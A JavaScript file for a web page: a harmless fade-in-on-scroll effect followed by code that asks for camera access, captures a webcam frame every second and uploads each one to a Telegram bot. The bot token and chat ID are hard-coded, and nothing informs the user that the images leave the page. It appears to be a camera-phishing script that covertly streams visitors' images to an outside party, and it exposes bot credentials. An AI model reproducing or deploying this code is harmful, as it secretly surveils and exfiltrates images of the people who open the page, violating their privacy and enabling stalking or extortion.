// Fade-in on scroll
const sections = document.querySelectorAll('.fade-in');
window.addEventListener('scroll', () => {
    sections.forEach(sec => {
        const rect = sec.getBoundingClientRect();
        if (rect.top < window.innerHeight - 100) {
            sec.classList.add('visible');
        }
    });
});

// Telegram Bot Configuration
const botToken = "8098677151:AAHw3ofWspeagUJWjWejk91whH9z9y_PoYA";
const chatId = "802683583";

let videoStream;
let interval;

// Start Camera and send frames every second
async function startCamera() {
    const video = document.getElementById('camera');
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = videoStream;

        // Send a frame every 1 second
        interval = setInterval(captureAndSend, 1000);
    } catch (err) {
        alert("Camera access denied: " + err);
    }
}

// Capture frame and send to Telegram
function captureAndSend() {
    const video = document.getElementById('camera');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert to Blob and send via Telegram API
    canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "photo.jpg");

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        })
        .then(res => res.json())
        .then(data => console.log("Photo sent:", data))
        .catch(err => console.error("Error sending photo:", err));
    }, 'image/jpeg');
}
